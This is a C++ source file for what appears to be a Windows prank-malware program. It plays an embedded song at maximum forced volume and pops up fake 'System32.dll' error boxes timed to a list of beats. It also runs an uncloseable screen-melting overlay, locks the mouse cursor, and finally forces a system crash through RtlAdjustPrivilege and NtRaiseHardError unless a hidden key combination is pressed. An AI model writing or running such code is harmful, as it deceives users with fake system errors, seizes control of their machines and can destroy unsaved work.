#include "framework.h"
#include "Application.h"
#include "BeatDetector.h"
#include "MemoryModule.h"

#include <windows.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <winternl.h>
#include <string>
#include <vector>
#include <mmsystem.h>
#include <mfplay.h>
#include <mfapi.h>
#include <mfidl.h>
#include <strsafe.h>
#include "MFPlayer.h"
#include <CommCtrl.h>

#pragma comment(lib, "mfplay.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "mf.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "msimg32.lib")

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")

#pragma comment(linker, \
    "\"/manifestdependency:type='Win32' "\
    "name='Microsoft.Windows.Common-Controls' "\
    "version='6.0.0.0' "\
    "processorArchitecture='*' "\
    "publicKeyToken='6595b64144ccf1df' "\
    "language='*'\"")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

bool killswitch = false;
int	meltWidth = 150;
int meltHeight = 15;
int interval = 0.5;
Vector4Int screen;
HHOOK keyboardHhook;
TimeStamp* localLastBeatOccured;

std::vector<std::string> beats{
    "0:6:403",
    "0:8:296",
    "0:9:405",
    "0:10:381",
    "0:12:342",
    "0:14:288",
    "0:15:193",
    "0:15:394",
    "0:16:182",
    "0:17:164",
    "0:18:151",
    "0:19:130",
    "0:20:110",
    "0:21:899",
    "0:22:785",
    "0:22:281",
    "0:23:605",
    "0:25:321",
    "0:26:426",
    "0:27:399",
    "0:28:385",
    "0:29:359",
    "0:30:245",
    "0:31:339",
    "0:32:307",
    "0:33:291",
    "0:34:284",
    "0:36:232",
    "0:37:230",
    "0:38:122",
    "0:40:186",
    "0:42:147",
    "0:46:862",
    "0:46:274",
    "0:47:669",
    "0:47:269",
    "0:48:500",
    "0:49:257",
    "0:49:241",
    "0:50:136",
    "0:50:223",
    "0:50:415",
    "0:51:389",
    "0:52:177",
    "0:53:175",
    "0:53:384",
    "0:54:160",
    "0:55:327",
    "0:56:116",
    "0:57:105",
    "0:58:883",
    "0:59:698",
    "1:0:477",
    "1:1:233",
    "1:2:197",
    "1:2:225",
    "1:3:214",
    "1:4:195",
    "1:5:175",
    "1:5:381",
    "1:6:156",
    "1:6:359",
    "1:7:142",
    "1:8:125",
    "1:9:289",
    "1:10:868",
    "1:11:288",
    "1:15:200",
    "1:22:868",
    "1:24:359",
    "1:25:142",
    "1:25:328",
    "1:26:114",
    "1:26:314",
    "1:27:943",
    "1:27:259",
    "1:28:862",
    "1:28:284",
    "1:29:679",
    "1:30:540",
    "1:30:238",
    "1:31:318",
    "1:31:229",
    "1:32:184",
    "1:32:315",
    "1:33:218",
    "1:33:410",
    "1:34:386",
    "1:35:176",
    "1:35:375",
    "1:36:366",
    "1:37:134",
    "1:37:344",
    "1:38:116",
    "1:38:312",
    "1:39:997",
    "1:39:303",
    "1:40:841",
    "1:41:770",
    "1:41:277",
    "1:42:549",
    "1:42:257",
    "1:42:407",
    "1:43:241",
    "1:44:208",
    "1:44:217",
    "1:45:14",
    "1:45:203",
    "1:45:412",
    "1:46:187",
    "1:46:348",
    "1:47:171",
    "1:48:375",
    "1:48:237",
    "1:49:127",
    "1:49:339",
    "1:50:112",
    "1:50:322",
    "1:51:104",
    "1:52:803",
    "1:52:290",
    "1:53:658",
    "1:53:277",
    "1:54:525",
    "1:54:214",
    "1:55:376",
    "1:55:240",
    "1:56:189",
    "1:56:215",
    "1:56:405",
    "1:57:205",
    "1:57:401",
    "1:58:188",
    "1:58:395",
    "1:59:266",
    "2:0:146",
    "2:0:349",
    "2:1:137",
    "2:1:336",
    "2:2:127",
    "2:2:324",
    "2:18:266",
    "2:19:328",
    "2:19:235",
    "2:20:181",
    "2:20:227",
    "2:21:17",
    "2:21:206",
    "2:21:397",
    "2:22:191",
    "2:22:380",
    "2:23:163",
    "2:23:354",
    "2:24:342",
    "2:25:917",
    "2:25:325",
    "2:26:113",
    "2:26:312",
    "2:27:985",
    "2:27:293",
    "2:28:792",
    "2:28:269",
    "2:29:282",
    "2:30:143",
    "2:31:310",
    "2:31:209",
    "2:32:202",
    "2:33:180",
    "2:34:678",
    "2:34:381",
    "2:36:148",
    "2:38:100",
    "2:38:326",
    "2:39:101",
    "2:40:843",
    "2:40:290",
    "2:41:673",
    "2:41:347",
    "2:42:249",
    "2:43:333",
    "2:44:145",
    "2:44:172",
    "2:45:306",
    "2:46:195",
    "2:46:386",
    "2:47:362",
    "2:48:157",
    "2:48:347",
    "2:50:410",
    "2:54:347",
    "2:56:224",
    "2:57:104",
    "2:58:190",
    "2:59:171",
    "3:0:155",
    "3:1:310",
    "3:2:206",
    "3:3:951",
    "3:6:150",
    "3:8:307",
    "3:9:404",
    "3:10:382",
    "3:12:156",
    "3:12:351",
    "3:13:135",
    "3:14:325",
    "3:15:296",
    "3:16:191",
    "3:17:650",
    "3:17:265",
    "3:19:234",
    "3:20:197",
    "3:20:383",
    "3:21:190",
    "3:21:383",
    "3:22:181",
    "3:23:166",
    "3:24:147",
    "3:24:346",
    "3:25:225",
    "3:26:112",
    "3:27:101",
    "3:28:820",
    "3:28:292",
    "3:29:684",
    "3:29:270",
    "3:30:490",
    "3:31:292",
    "3:32:131",
    "3:32:216",
    "3:32:416",
    "3:33:411",
    "3:36:142",
    "3:39:906",
    "3:39:284",
    "3:40:828",
    "3:40:286",
    "3:41:691",
    "3:41:267",
    "3:42:255",
    "3:44:222",
    "3:46:188",
    "3:48:144",
    "3:49:136",
    "3:50:120",
    "3:50:408",
    "3:51:316",
    "3:53:669",
    "3:54:444",
    "3:54:348",
    "3:56:134",
    "3:56:204",
    "3:56:403",
    "3:57:393",
    "3:58:273",
    "3:59:355",
    "4:0:365",
    "4:1:327",
    "4:2:213",
    "4:3:309",
    "4:4:287",
    "4:6:257",
    "4:7:375",
    "4:7:231",
    "4:8:223",
    "4:9:411",
    "4:11:165",
    "4:12:151",
    "4:16:860",
    "4:19:328",
    "4:20:137",
    "4:20:398",
    "4:22:382",
    "4:23:363",
    "4:24:351",
    "4:26:320",
    "4:27:312",
    "4:28:854",
    "4:28:286",
    "4:29:270",
    "4:30:250",
    "4:31:236",
    "4:32:227"
};

void ShowErrorMessage(PCWSTR format, HRESULT hrErr)
{
    HRESULT hr = S_OK;
    WCHAR msg[MAX_PATH];

    hr = StringCbPrintf(msg, sizeof(msg), L"%s (hr=0x%X)", format, hrErr);

    if (SUCCEEDED(hr))
    {
        MessageBox(NULL, msg, L"Error", MB_ICONERROR);
    }
}

void rotateScreen(DWORD rotation) {
    DEVMODE mode;
    ZeroMemory(&mode, sizeof(mode));
    mode.dmSize = sizeof(mode);

    if (EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &mode) != 0) {
        DWORD tmp = mode.dmPelsHeight;
        mode.dmPelsHeight = mode.dmPelsWidth;
        mode.dmPelsWidth = tmp;
        mode.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_DISPLAYORIENTATION;
        mode.dmDisplayOrientation = rotation;

        ChangeDisplaySettingsEx(NULL, &mode, NULL, 0, NULL);
    }
}

DWORD WINAPI _CreateXMessageBox(LPVOID lpPram) {
    PARAMS* params = (PARAMS*)lpPram;

    XMessageBox(params->hwnd, params->lpszMessage, params->lpszCaption, params->nStyle, params->pXMB);
    return 0;
}

void CreateXMessageBox(PARAMS* param) {
	CloseHandle(CreateThread(NULL, 0, &_CreateXMessageBox, (LPVOID) param, 0, 0));
}

LRESULT WINAPI MelterProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
    switch (Msg)
    {
    case WM_CREATE:
    {
        HDC hdcDesktop = GetDC(HWND_DESKTOP);
        HDC hdcWindow = GetDC(hWnd);
        BitBlt(hdcWindow, screen.w, screen.x, screen.y, screen.z, hdcDesktop, 0, 0, SRCCOPY);
        ReleaseDC(hWnd, hdcWindow);
        ReleaseDC(HWND_DESKTOP, hdcDesktop);
        SetTimer(hWnd, 0, interval, NULL);
        ShowWindow(hWnd, SW_SHOW);
    }
    return 0;
    case WM_ERASEBKGND:
        return 0;
    case WM_PAINT:
        ValidateRect(hWnd, NULL);
        return 0;
    case WM_TIMER:
    {
        HDC hdcWindow = GetDC(hWnd);
        int	x = (rand() % screen.y) - (meltWidth / 2),
            y = (rand() % meltHeight),
            width = (rand() % meltWidth);
        BitBlt(hdcWindow, x, y, width, screen.z, hdcWindow, x, 0, SRCCOPY);
        ReleaseDC(hWnd, hdcWindow);
    }
    return 0;
    case WM_CLOSE:
#ifndef _DEBUG
        return 0; // disable closing
#endif
    case WM_DESTROY:
    {
        KillTimer(hWnd, 0);
        PostQuitMessage(0);
    }
    return 0;
    }

    return DefWindowProc(hWnd, Msg, wParam, lParam);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nShowCmd)
{
#ifdef _DEBUG
    AllocConsole();
	
    FILE* fDummy;
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONIN$", "r", stdin);
    std::cout.clear();
    std::clog.clear();
    std::cerr.clear();
    std::cin.clear();

    // std::wcout, std::wclog, std::wcerr, std::wcin
    HANDLE hConOut = CreateFile(_T("CONOUT$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hConIn = CreateFile(_T("CONIN$"), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetStdHandle(STD_OUTPUT_HANDLE, hConOut);
    SetStdHandle(STD_ERROR_HANDLE, hConOut);
    SetStdHandle(STD_INPUT_HANDLE, hConIn);
    std::wcout.clear();
    std::wclog.clear();
    std::wcerr.clear();
    std::wcin.clear();
	
    printf("Debugging Window:\n");
#endif

	// load fmodex dll from memory
#ifdef _WIN64
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL2), L"DLL");
#else
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), L"DLL");
#endif
    HGLOBAL hResourceData = LoadResource(NULL, hResource);
	
    HMEMORYMODULE handle = MemoryLoadLibrary(hResourceData);
    if (handle == NULL) {
        MessageBox(NULL, L"Failed to load fmodex.dll", L"Error", MB_OK);
    }

    // Write Retro Fad.wav resource to disk
    hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_MP31), L"MP3");
    hResourceData = LoadResource(NULL, hResource);
    DWORD dwResourceSize = SizeofResource(NULL, hResource);
    LPVOID pResourceData = LockResource(hResourceData);
    FILE* fp;
    fopen_s(&fp, "Retro Fad.mp3", "wb");
    fwrite(pResourceData, dwResourceSize, 1, fp);
    fclose(fp);

    bool exitBool = false;

    SetThreadDpiAwarenessContext(DPI_AWARENESS_CONTEXT_SYSTEM_AWARE);

    screen = {
        GetSystemMetrics(SM_XVIRTUALSCREEN), // a |----------------------|
        GetSystemMetrics(SM_YVIRTUALSCREEN), // b |a:b       |           |
        GetSystemMetrics(SM_CXVIRTUALSCREEN),// c |          |        c:d|
        GetSystemMetrics(SM_CYVIRTUALSCREEN) // d |----------------------|
    };

#ifndef _DEBUG
    CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER, __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    IMMDevice* defaultDevice = NULL;
    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    deviceEnumerator = NULL;
    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    defaultDevice = NULL;
    endpointVolume->SetMasterVolumeLevelScalar((float)1.0, NULL);
    endpointVolume->Release();
    CoUninitialize();
#endif

    HRESULT hr = NULL;

    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (FAILED(hr)) {
        ShowErrorMessage(L"Failed to initialize Media Fondation ! Error: ", hr);
        return 1;
    }

    MFPlayer* m_pPlayer;
    hr = MFPlayer::CreateInstance(NULL, NULL, &m_pPlayer);
    if (FAILED(hr)) {
        printf("Failed to instanciate MFPlayer !\n");
        return 1;
    }
	
    hr = m_pPlayer->OpenURL(L"Retro Fad.mp3");
    if (FAILED(hr)) {
        printf("Failed to open URL !\n");
        return 1;
    }

    hr = m_pPlayer->Play();
    if (FAILED(hr)) {
        printf("Failed to play !\n");
        return 1;
    }

    MessageBox(NULL, L"A", L"N", MB_OK);

    while (true) {
        MFTIME time;
        hr = m_pPlayer->GetCurrentPosition(&time);
        if (SUCCEEDED(hr)) {
            int minutes = time / (10000000 * 60);
            int seconds = (time / 10000000) - (60 * minutes);
            int miliseconds = (time / 1000) - (10000 * seconds);
            std::string t = std::to_string(minutes).append(":").append(std::to_string(seconds)).append(":").append(std::to_string(miliseconds));
            t.pop_back();

            std::cout << "TIME: " << t.c_str() << std::endl;
            std::string s;
            
            if (std::find(beats.begin(), beats.end(), t) != std::end(beats)) {
                std::remove(beats.begin(), beats.end(), t);
                PARAMS* params = new PARAMS();
                params->hwnd = NULL;
                params->lpszCaption = L"System32.dll";
                params->lpszMessage = L"Oups ! Look like your system is having some troubles !";
                params->nStyle = MB_OK | MB_ICONERROR;
                params->pXMB = new XMSGBOXPARAMS();
                params->pXMB->x = rand() % screen.y;
                params->pXMB->y = rand() % screen.z;

                CreateXMessageBox(params);
            }
        }
    }

   /* IMFPMediaPlayer* player = NULL;
    hr = MFPCreateMediaPlayer(
        L"Retro Fad.mp3",
        TRUE,   // Start playback automatically?
        0,      // Flags.
        NULL,   // Callback pointer.
        NULL,
        &player
    );
	
    if (FAILED(hr)) {
        ShowErrorMessage(L"Failed to create Media Player ! Error: ", hr);
        return 1;
    }

    while (true) {
        PROPVARIANT var;
        PropVariantInit(&var);
        hr = player->GetPosition(MFP_POSITIONTYPE_100NS, &var);
        if (FAILED(hr)) {
			printf("Failed to get position ! Error: %X\n", hr);
            continue;
        }
		
        LONGLONG pos = var.hVal.QuadPart;
        printf(std::to_string(pos).c_str());
        PropVariantClear(&var);
    }*/
	
   /* BeatDetector* detector = BeatDetector::Instance();
    detector->loadSystem();
	detector->LoadSong(1024, "Retro Fad.mp3");
    //detector->setStarted(true);

    while (!(detector->getCurrentTime() != NULL && detector->getCurrentTime()->getMinutes() == 4 && detector->getCurrentTime()->getSeconds() >= 30) && !killswitch) {
        detector->updateTime();

        if (std::find(beats.begin(), beats.end(), detector->getCurrentTime()->toString()) != beats.end()) {
            printf("BEAT\n");
        }

       /* if (localLastBeatOccured != detector->getLastBeat()) {
            PARAMS* params = new PARAMS();
            params->hwnd = NULL;
            params->lpszCaption = L"System32.dll";
            params->lpszMessage = L"Oups ! Look like your system is having some troubles !";
            params->nStyle = MB_OK | MB_ICONERROR;
            params->pXMB = new XMSGBOXPARAMS();
            params->pXMB->x = rand() % screen.y;
            params->pXMB->y = rand() % screen.z;

            //CreateXMessageBox(params);
       
            if(detector->getCurrentTime()->getMinutes() > 0 || detector->getCurrentTime()->getSeconds() >= 46) {
               // rotateScreen(rand() % 4);
            }

			localLastBeatOccured = detector->getLastBeat();
        }*/

       /* if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_END) & 0x8000) && (GetAsyncKeyState(VK_F1) & 0x8000)) {
            killswitch = true;
        }
    }*/

    rotateScreen(0);

    if (!killswitch) {
        std::thread exitThread(WaitAndSet, 50, &exitBool);

        WNDCLASS wndClass = { 0, MelterProc, 0, 0, hInstance,
            LoadIcon(NULL, L"IDI_SMALL"), LoadCursor(NULL, NULL),
            (HBRUSH)(COLOR_BACKGROUND + 1), 0, L"Melter" };

        if (!RegisterClass(&wndClass))
            return MessageBoxA(HWND_DESKTOP, "Cannot register class!", NULL, MB_ICONERROR | MB_OK);

        HWND hWnd = CreateWindowA("Melter", NULL, WS_POPUP, screen.w, screen.x, screen.y, screen.z, HWND_DESKTOP, NULL, hInstance, NULL);
        if (!hWnd)
            return MessageBoxA(HWND_DESKTOP, "Cannot create window!", NULL, MB_ICONERROR | MB_OK);

        srand(GetTickCount64());
        MSG Msg = { 0 };
        while (Msg.message != WM_QUIT)
        {
            if (PeekMessage(&Msg, NULL, 0, 0, PM_REMOVE))
            {
                TranslateMessage(&Msg);
                DispatchMessage(&Msg);
            }

            if (exitBool)
                DestroyWindow(hWnd);

#ifdef _DEBUG
            if (GetAsyncKeyState(VK_ESCAPE) & 0x8000)
                DestroyWindow(hWnd);
#endif

#ifndef _DEBUG
            SetCursorPos(0, 0);
#endif

            if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_END) & 0x8000) && (GetAsyncKeyState(VK_F1) & 0x8000)) {
                DestroyWindow(hWnd);
                killswitch = true;
            }
        }

        exitThread.join();
    }
	
    MemoryFreeLibrary(handle);
#ifndef _DEBUG
    if (!killswitch) {
        BOOLEAN PrivilegeState = FALSE;
        ULONG ErrorResponse = 0;
        RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
        NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
    }
#endif
    return 0;
}